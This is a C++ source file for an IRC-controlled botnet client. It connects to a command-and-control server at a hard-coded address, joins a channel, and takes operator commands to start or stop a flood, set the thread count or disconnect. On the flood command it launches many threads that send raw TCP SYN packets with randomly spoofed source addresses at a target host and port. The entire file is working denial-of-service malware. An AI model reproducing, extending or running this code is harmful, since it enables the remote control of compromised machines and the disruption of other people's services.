#include <iostream>
#include <stdlib.h>
#include <pthread.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>

#define SERV_ADDR "192.168.47.1"
#define SERV_PORT 6667
#define CHAN "#bots"
#define CHANLEN 5
#define MAX_WORDS 4
#define DELAY 1000

static int flooding = 0;
static int toggle = 0;
static bool MPTCP_STATUS = 0;
static int MAX_THREADS = 64;
static int THREAD_NUM = MAX_THREADS;

struct flood_args{
    char *addr;
    int port;
};

/* Internet Datagram Header */
#define IPHDR_LEN 20
struct iphdr {
	unsigned char ipv:4;     /* Internet Protocol Version */
	unsigned char ihl:4;     /* Total length (in DWORDs) */
	unsigned char tos;       /* Type of Service */
	unsigned short len;      /* Total length */
	unsigned short id;       /* Identification number */
	unsigned short frag;     /* Fragment offset and flags */
	unsigned char ttl;       /* Time to live */
	unsigned char proto;     /* Protocol type */
	unsigned short chksum;   /* Checksum */
	unsigned int src;        /* Source IP Address */
	unsigned int dst;        /* Destination IP Address */
};

/* TCP Header */
#define TCPHDR_LEN 20
struct tcphdr {
	unsigned short sport;      /* Source Port */
	unsigned short dport;      /* Destination Port */
	unsigned int seq;          /* Sequence number */
	unsigned int ack;          /* Acknowledgement number */
	unsigned char reserved:4;
	unsigned char offset:4;    /* Size of TCP Header in DWORDs */
	unsigned char flgs;        /* TCP Flags */
#define TCP_FIN 0x01
#define TCP_SYN 0x02
#define TCP_RST 0x04
#define TCP_PSH 0x08
#define TCP_ACK 0x10
#define TCP_URG 0x20
	unsigned short win;        /* Window. Size of data to accept */
	unsigned short chksum;     /* Checksum */
	unsigned short urgp;       /* idk */
};

/* TCP Psuedo-header */
#define TCPPH_LEN 12
struct tcpph {
	unsigned int src;
	unsigned int dst;
	unsigned char zero;
	unsigned char proto;
	unsigned short tcp_len;
};

unsigned short csum(short* data, int len) {
	int sum = 0;
	for (; len > 1; len -= 2) sum += *data++;
	if (len == 1) sum += *(unsigned char*)data;
	while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
	return ~sum;
}

unsigned short rand16() {
	srandom(time(NULL));
	srand(random());
	srandom(rand());
	return (random() + rand() + time(NULL)) % 65535;
}

unsigned int rand32() {
	srandom(time(NULL));
	srand(random());
	srandom(rand());
	return (random() + rand() & time(NULL));
}

char* randip(char* dst){
	dst[0] = 0;
	int i, j, k;
	srandom(time(0));
	srand(random());
	srandom(rand());
	j = rand() + random();
	for (i = 0, k = 0; k < 4; i += strlen(dst + i), k++, j += ((rand() + (long)dst) % i) ^ time(0)) {
		srand((long)dst + i + k);
		srand(j + dst[i+k] + (long)&i + rand());
		j = rand() % 255;
		sprintf(dst + i, "%d.", j);
	}
	dst[i-1] = 0;
	return dst;
}

void *flood(void *args){

    int sd;
    char rip[16];
	char packet[4096];
	struct iphdr ip;
	struct tcpph tph;
	struct tcphdr tcp;
	struct sockaddr_in sin;
	const int on = 1;

	memset(&packet, 0, 40);
	ip.ihl = 5;
	ip.ipv = 4;
	ip.tos = 0;
	ip.len = IPHDR_LEN + TCPHDR_LEN;
	ip.id = htons(rand16());
	ip.ttl = 128;
	ip.proto = IPPROTO_TCP;
	ip.src = (unsigned int)inet_addr(randip(rip));//
	ip.dst = (unsigned int)inet_addr(((struct flood_args*)args)->addr);
	ip.chksum = 0;
	ip.chksum = csum((short*)&ip, IPHDR_LEN);
	tcp.sport = htons(6667);//
	tcp.dport = htons((short)(((struct flood_args*)args)->port));
	tcp.seq = htonl(rand32());//
	tcp.offset = sizeof(struct tcphdr) / 4;
	tcp.flgs = TCP_SYN;
	tcp.chksum = 0;
	tph.src = ip.src;
	tph.dst = ip.dst;
	tph.zero = 0;
	tph.proto = IPPROTO_TCP;
	tph.tcp_len = sizeof(struct tcphdr);
	memmove(packet, &tph, TCPPH_LEN);
	memmove(packet + TCPPH_LEN, &tcp, TCPHDR_LEN);
	tcp.chksum = csum((short*)packet, TCPPH_LEN + TCPHDR_LEN);
	memmove(packet, &ip, IPHDR_LEN);
	memmove(packet + IPHDR_LEN, &tcp, TCPHDR_LEN);

	sd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

	setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
	setsockopt(sd, 6, 42, &MPTCP_STATUS, sizeof(MPTCP_STATUS));

	sin.sin_family = AF_INET;
	sin.sin_port = htons(tcp.dport);
	memmove(&(sin.sin_addr), &(ip.dst), sizeof(struct in_addr));
	while (1) {
        if (sendto(sd, packet, ip.len, 0, (struct sockaddr*)&sin, sizeof(struct sockaddr)) == -1) {
            printf("Failed to send SYN packet(s). Error code: %d\n", errno);
			return NULL;
		}
        else //printf("Sent SYN packet with spoofed ip: %s\n", rip);
		ip.id = htons(rand16());
		ip.src = (unsigned int)inet_addr(randip(rip));
		ip.chksum = 0;
		ip.chksum = csum((short*)&ip, IPHDR_LEN);
		tph.src = ip.src;
		tcp.seq = htonl(rand32());
		tcp.chksum = 0;
		memmove(packet, &tph, TCPPH_LEN);
		memmove(packet + TCPPH_LEN, &tcp, TCPHDR_LEN);
		tcp.chksum = csum((short*)packet, TCPPH_LEN + TCPHDR_LEN);
		memmove(packet, &ip, IPHDR_LEN);
		memmove(packet + IPHDR_LEN, &tcp, TCPHDR_LEN);
	}

}
//---------------------------------------------------------------------------------------------------------------------------------------------------
class plug {
public:
    int fd;
    int link(const char* host, int port); /* Connect */
    int unlink(); /* Disconnect */
    int in(char* buf); /* Read line (plus added nul char) */
    int out(const char* buf); /* Write line */
    plug& operator <<(const char* buf);
    plug();
private:
    int bi;
    char buffer[512];
};

plug::plug() {
    bi = 0;
}

int plug::link(const char* host, int port) {
    struct sockaddr_in si;
    struct hostent *hostess_twinkies = gethostbyname(host);
    fd = socket(PF_INET, SOCK_STREAM, 0);
    si.sin_family = AF_INET;
    si.sin_port = htons(port);
    si.sin_addr = *((struct in_addr*)hostess_twinkies->h_addr);
    memset(&(si.sin_zero), 0, 8);
    if (connect(fd,(struct sockaddr*)&si,sizeof(struct sockaddr))==-1) fd=0;
    return fd;
}

int plug::unlink() { return close(fd); }

int plug::in(char* buf) {
    int len;
    for (len=0;recv(fd,buf,1,0);len++,buf++)
        if (*buf=='\n')
            if (*(buf-1)=='\r') {
                *(buf+1)=0;
                return len;
            }
}
int plug::out(const char* buf) {
    int i;
    for (i=0;*(short*)buf!=0x0a0d;i++,buf++);
    buf-=i; i+=2;
    return send(fd,buf,i,0);
}

plug& plug::operator <<(const char* buf) {
    int len = strlen(buf);
    memmove(buffer+bi,buf,len);
    bi+=len;
    if (buf[len-1]=='\n' && buf[len-2]=='\r') {
        send(fd,buffer,bi,0);
        bi = 0;
    }
    return *this;
}
//---------------------------------------------------------------------------------------------------------------------------------------------------------

static plug s;

void quit(int sig) {
    s.unlink();
    exit(0);
}

using namespace std;

int initThreads(pthread_attr_t *attr){
    if(pthread_attr_init(attr) || pthread_attr_setdetachstate(attr, PTHREAD_CREATE_DETACHED)){
            cout << "Could not init pthread_attr" << endl;
            return -1;
    }
    return 1;
}
int attachThreads(pthread_t *threads, pthread_attr_t *attr, flood_args *args, int num){
    for(int j = 0; j < num; j++){
        if(!pthread_create(threads + j, (const pthread_attr_t*)attr, flood, (void*)args)){
                pthread_detach(*(threads + j));
        }
        else{
            cout << "Could not create threads" << endl;
            return -1;
        }
    }
    pthread_attr_destroy(attr);
    return 1;
}
int killThreads(pthread_t *threads, pthread_attr_t *attr, int num){
    for(int j = 0; j < num; j++){
        pthread_cancel(*(threads + j));
    }
    return 1;
}
//------------------------------------------------------------------------------------------------------------------------------
char* generateNick(){
	char str[6] = "bot  ";
    char *nick = str;
    srand(time(NULL));
    *(nick + 3) = 48 + rand()%9;
    *(nick + 4) = 48 + rand()%9;
    return nick;
}

int ircParseCommand(char *line, pthread_t *threads, pthread_attr_t *attr, flood_args *args){

    char *tok = strtok(line, " ");

    cout << "Command to parse: " << line << endl;

    if(*tok == 'k'){//kill_bots
        if(flooding)killThreads(threads, attr, MAX_THREADS);
        flooding = 0;
        s << "QUIT :disconnecting\r\n";
        return 1;
    }

    if(*tok == 'f' && !flooding){//flood
            char *tok2 = NULL;
            char *tok3 = NULL;
            tok2 = strtok(NULL, " ");
            tok3 = strtok(NULL, " ");
            if(tok2 != NULL && tok3 != NULL){
                if(gethostbyname(tok2) != NULL){
                    int tmp;
                    try{
                        tmp = atoi(tok3);
                    }
                    catch(...){
                        cout << "flood: invalid arguments" << endl;
                        return 0;
                    }
                    cout << "Started flooding " << tok2 << ":" << tmp << endl;
                    cout << "MPTCP_STATUS set to " << MPTCP_STATUS << endl;
                    args->addr = tok2;
                    args->port = tmp;
                    initThreads(attr);
                    attachThreads(threads, attr, args, THREAD_NUM);
                    flooding = 1;
                    return 0;
                }
                cout << "flood: invalid arguments" << endl;
                return 0;
            }
            cout << "flood: invalid arguments" << endl;
            return 0;
    }

    if(*tok == 's'){//stop_flood
            if(flooding){
                killThreads(threads, attr, MAX_THREADS);
                cout << "Stopped flooding" << endl;
                flooding = 0;
            }
            return 0;
    }

    if(*tok == 't'){//toggle_mptcp
            MPTCP_STATUS = !MPTCP_STATUS;
            cout << "MPTCP_STATUS set to " << MPTCP_STATUS << endl;
            return 0;
    }

    if(*tok == 'n'){//number_threads
            char *tok2 = NULL;
            tok2 = strtok(NULL, " ");
            if(tok2 != NULL){
                int tmp;
                try{
                    tmp = atoi(tok2);
                }
                catch(...){
                    cout << "set_threadnum: invalid arguments" << endl;
                    return 0;
                }
                THREAD_NUM = tmp;
                cout << "THREAD_NUM set to " << THREAD_NUM << endl;
                return 0;
            }
            cout << "set_threadnum: invalid arguments" << endl;
            return 0;
    }

    cout << "Unknown command" << endl;
    return 0;
}

int main(){

    pthread_t threads[THREAD_NUM];
    pthread_attr_t attr;

    struct flood_args args;

    struct sigaction sa;
    sa.sa_handler = &quit;
    sa.sa_flags = 0;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT,&sa,0);

    char buf[513];

    s.link(SERV_ADDR, SERV_PORT);

    char *nick = generateNick();
    s << "USER " << nick << " 0 * :" << nick << "\r\n";
    s << "NICK " << nick << "\r\n";

    while (s.in(buf)) {
            if (strstr(buf, "PING ") == buf) {
                s << "PO" << buf + 2;
            } else if (*buf == ':' && !memcmp(strchr(buf, ' ') + 1, "001", 3)) {
                s << "MODE " << nick << " +B\r\n";
                s << "JOIN " << CHAN << "\r\n";

            } else if (*buf == ':' && !memcmp(strchr(buf, ' ') + 1, "433", 3)) {
                s << "MODE " << generateNick() << " +B\r\n";
                s << "JOIN " << CHAN << "\r\n";

            }else if (*buf == ':' && !memcmp(strchr(buf, ' ') + 1, "PRIVMSG", 7)) {
                if (!memcmp(strchr(buf, '#'), CHAN, CHANLEN)){
                    char *str = strchr(buf, '-');
                    if(str != NULL)toggle = ircParseCommand(++str, threads, &attr, &args);
                }
            }
            cout << buf;
           if(toggle){
                s.unlink();
                return 0;
           }
    }
    s.unlink();
    return 0;
}
